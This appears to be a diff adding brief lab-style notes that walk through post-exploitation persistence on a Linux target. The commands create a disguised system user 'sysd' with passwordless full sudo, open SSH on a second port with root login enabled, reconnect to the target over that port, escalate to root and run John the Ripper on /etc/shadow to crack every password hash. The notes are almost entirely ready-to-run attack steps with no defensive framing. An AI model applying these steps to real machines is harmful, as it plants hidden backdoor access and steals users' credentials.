@@ -1,0 +1,52 @@
+
+1. Create a secret user named sysd
+
+    useradd -r sysd
+  Verified via
+    tail /etc/passwd
+
+2. Give sysd a password
+
+    passwd sysd
+      New password:
+      Retype new password:
+
+3. Give sysd full sudo access without needing a password
+
+    visudo
+    sysd ALL=(ALL) NOPASSWD: ALL
+
+4. Test sudo access works without password
+
+    su sysd
+    sudo -l
+
+5. Edit the sshd_config file
+
+    nano file
+    
+  Add additional line under Port 22
+    "Port 2222"
+
+  Change SSH configurations to allow root login
+    PermitRootLogin yes
+
+6. Restart ssh service
+
+    sudo service ssh restart
+
+7. Exit root account
+
+  This tests the efficacy of the changes and verifies the persistence of the attack vector
+
+8. SSH to the target machine using sysd account and port 2222
+
+    ssh sysd@TAR.GET.IPA.DDR -p 2222
+
+9. Use sudo to switch to root user
+
+    sudo su
+
+10. Use John to crack the entire /etc/shadow file
+
+    john /etc/shadow
